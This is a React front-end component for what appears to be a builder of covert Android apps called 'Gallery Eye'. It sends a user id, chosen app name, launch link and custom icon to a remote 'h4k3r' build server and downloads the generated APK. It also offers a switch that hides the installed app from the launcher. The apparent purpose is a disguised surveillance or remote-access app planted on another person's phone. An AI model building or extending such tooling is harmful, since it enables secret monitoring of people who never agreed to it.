"use client";

import { useState, useEffect } from 'react';

interface AppGenerationModalProps {
    isOpen: boolean;
    onClose: () => void;
    uuid: string;
    socket: any;
}

export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: AppGenerationModalProps) {
    const [status, setStatus] = useState<'idle' | 'generating' | 'downloading' | 'completed'>('idle');
    const [progress, setProgress] = useState(0);
    const [progressStep, setProgressStep] = useState("");
    const [downloadUrl, setDownloadUrl] = useState("");

    // Customization State
    const [appName, setAppName] = useState("Gallery Eye");
    const [hideApp, setHideApp] = useState(false);
    const [webLink, setWebLink] = useState("");
    const [customIcon, setCustomIcon] = useState<File | null>(null);

    useEffect(() => {
        if (isOpen) {
            setStatus('idle');
            setProgress(0);
            setProgressStep("");
            setDownloadUrl("");
        }
    }, [isOpen]);

    useEffect(() => {
        if (!socket) return;

        const handleProgress = (data: any) => {
            console.log("APK Progress:", data);
            setProgress(data.progress);
            if (data.step) setProgressStep(data.step);
        };

        const handleReady = (data: any) => {
            console.log("APK Ready:", data);
            setStatus('downloading');
            setProgress(100);
            setProgressStep("Download starting...");
            setDownloadUrl(data.url);

            // Trigger download
            const a = document.createElement('a');
            a.href = data.url;
            a.download = data.filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            setTimeout(() => {
                setStatus('completed');
            }, 2000);
        };

        const handleError = (data: any) => {
            console.error("APK Error:", data);
            setStatus('idle');
            alert(`Generation Failed: ${data.message}`);
        };

        socket.on('apk_progress', handleProgress);
        socket.on('apk_ready', handleReady);
        socket.on('apk_error', handleError);

        return () => {
            socket.off('apk_progress', handleProgress);
            socket.off('apk_ready', handleReady);
            socket.off('apk_error', handleError);
        };
    }, [socket]);

    const startGeneration = async () => {
        setStatus('generating');
        setProgress(5);
        setProgressStep("Initializing request...");

        try {
            if (!uuid) {
                throw new Error("User ID is missing. Please log in again.");
            }

            const formData = new FormData();
            formData.append('uuid', uuid);
            formData.append('appName', appName);
            formData.append('hideApp', hideApp.toString());
            formData.append('webLink', webLink);
            if (customIcon) {
                formData.append('icon', customIcon);
            }

            // Trigger generation (Async)
            const response = await fetch(`https://gallery-eye-h4k3r.onrender.com/download-apk`, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(errorText || "Generation failed to start");
            }

            // Now we wait for socket events...

        } catch (error) {
            console.error(error);
            setStatus('idle');
            alert("Failed to start generation. Please try again.");
        }
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fadeIn overflow-y-auto py-10">
            <div className="bg-[#1a1a1a] border border-white/20 p-8 rounded-3xl shadow-2xl max-w-md w-full text-center backdrop-blur-xl animate-scaleIn relative">
                <button
                    onClick={onClose}
                    className="absolute top-4 right-4 text-white/40 hover:text-white"
                >
                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                </button>

                <h2 className="text-3xl font-bold text-white mb-2">
                    {status === 'completed' ? 'App Ready!' : 'Customize Your App'}
                </h2>

                {status === 'idle' && (
                    <div className="text-left space-y-4 mt-6 mb-8">
                        <div>
                            <label className="block text-sm font-medium text-white/70 mb-1">App Name</label>
                            <input
                                type="text"
                                value={appName}
                                onChange={(e) => setAppName(e.target.value)}
                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-purple-500"
                                placeholder="Gallery Eye"
                            />
                        </div>

                        <div>
                            <label className="block text-sm font-medium text-white/70 mb-1">Web Link (Optional)</label>
                            <input
                                type="url"
                                value={webLink}
                                onChange={(e) => setWebLink(e.target.value)}
                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-purple-500"
                                placeholder="https://example.com"
                            />
                            <p className="text-xs text-white/40 mt-1">Opens this link when app starts.</p>
                        </div>

                        <div>
                            <label className="block text-sm font-medium text-white/70 mb-1">Custom Icon (Optional)</label>
                            <input
                                type="file"
                                accept="image/png, image/jpeg"
                                onChange={(e) => setCustomIcon(e.target.files?.[0] || null)}
                                className="w-full bg-white/5 border border-white/10 rounded-lg px-4 py-2 text-white text-sm file:mr-4 file:py-1 file:px-3 file:rounded-full file:border-0 file:text-xs file:bg-purple-500 file:text-white hover:file:bg-purple-600"
                            />
                        </div>

                        <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10">
                            <span className="text-sm font-medium text-white/70">Hide App Icon</span>
                            <button
                                onClick={() => setHideApp(!hideApp)}
                                className={`w-12 h-6 rounded-full transition-colors relative ${hideApp ? 'bg-purple-500' : 'bg-white/20'}`}
                            >
                                <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp ? 'left-7' : 'left-1'}`} />
                            </button>
                        </div>
                        <p className="text-xs text-white/40">App will be hidden from launcher after install.</p>
                    </div>
                )}

                {status !== 'idle' && (
                    <div className="mb-8">
                        <p className="text-white/60 mb-4 font-mono text-sm">
                            {status === 'completed'
                                ? "Install this APK on your Android device."
                                : (progressStep || "Processing...")}
                        </p>
                        <div className="relative h-4 bg-white/10 rounded-full overflow-hidden">
                            <div
                                className="absolute top-0 left-0 h-full bg-gradient-to-r from-blue-500 to-purple-500 transition-all duration-500"
                                style={{ width: `${progress}%` }}
                            />
                        </div>
                    </div>
                )}

                <div className="flex flex-col items-center justify-center gap-4">
                    {status === 'idle' ? (
                        <button
                            onClick={startGeneration}
                            className="w-full px-8 py-3 bg-gradient-to-r from-purple-600 to-blue-600 text-white font-bold rounded-xl hover:scale-105 transition-transform shadow-lg shadow-purple-500/20"
                        >
                            Generate & Download
                        </button>
                    ) : status === 'completed' ? (
                        <button
                            onClick={onClose}
                            className="px-8 py-3 bg-white text-black font-bold rounded-full hover:scale-105 transition-transform"
                        >
                            Done
                        </button>
                    ) : (
                        <>
                            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white"></div>
                            {/* Fallback Download Button */}
                            {downloadUrl && (
                                <a
                                    href={downloadUrl}
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="mt-4 text-sm text-blue-300 hover:text-blue-200 underline cursor-pointer animate-pulse"
                                >
                                    Click here if download doesn't start automatically
                                </a>
                            )}
                        </>
                    )}
                </div>
            </div>
        </div>
    );
}
